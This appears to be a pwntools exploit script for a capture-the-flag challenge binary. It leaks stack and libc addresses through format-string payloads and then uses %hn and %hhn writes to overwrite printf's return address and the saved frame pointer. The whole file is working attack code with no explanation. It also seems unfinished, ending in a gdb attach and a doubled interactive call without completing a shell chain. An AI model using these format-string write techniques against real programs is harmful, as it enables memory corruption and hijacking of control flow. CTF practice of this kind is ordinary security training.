from pwn import *

binary = './attachment_patched'
libc = ELF('./libc.so.6')

p = process(binary)

s = '''
b * printf
b * printf+198
'''

def padding(written, bytes_to_write, maximum):
	if written % maximum < bytes_to_write:
		return bytes_to_write - (written % maximum)
	else:
		return maximum - (written % maximum) + bytes_to_write
# leaking a stack address, to overwrite an existing stack address to rsp and overwrite rsp of printf
payload = b"%6$p" # can only leak one address
p.sendline(payload)
p.recvuntil(b"give you one chance!!!\n")
leak = p.recvline().strip().decode()
leak = int(leak, 16)
rip_pos = leak - 0x120
print("Rip position: ", hex(rip_pos))

# partial overwriting the first byte of return address of `printf` to 0x10, changing it to return to main+5
bytes_to_write = rip_pos & 0xffff
payload = f"%{bytes_to_write-4}c%c%c%c%c%hn".encode()
written = bytes_to_write
bytes_to_write = padding(written, 0x7e, 0x100) # max being 0x100 for hhn
payload += f"%{bytes_to_write}c%41$hhn".encode()

p.recvuntil(b"begin your challenge\n")

p.sendline(payload)



payload = b"%p\n%11$p"
written = len(payload)
bytes_to_write = padding(written, 0x7e, 0x100)
payload += f"%{bytes_to_write-0x15}c%41$hhn".encode()
payload += b'A' * 0x30
p.recvuntil(b"begin your challenge\n")


p.sendline(payload)

leak1 = int(p.recvline().strip().decode(), 16)
leak2 = int(p.recv(14).decode(), 16)
print("Buf: ", hex(leak1))
print("libc leak: ", hex(leak2))
buf = leak1
libc_base = leak2 - 0x24083

bytes_to_write = padding(0, 0x7e, 0x100) # max being 0x100 for hhn
pos = int(0x118 / 8 + 6)
payload = f"%{bytes_to_write}c%{pos}$hhn".encode()
written = bytes_to_write
rbp_pos = rip_pos + 0x28
bytes_to_write = padding(written, rbp_pos & 0xffff, 0x10000)
pos = int(0xb8 / 8 + 6)
payload += f"%{bytes_to_write}c%{pos}$hn".encode()
payload += b'A' * 0x30
print(len(payload))

p.recvuntil(b"challenge\n")

gdb.attach(p, s)
p.sendline(payload)
p.interactive()

p.interactive()





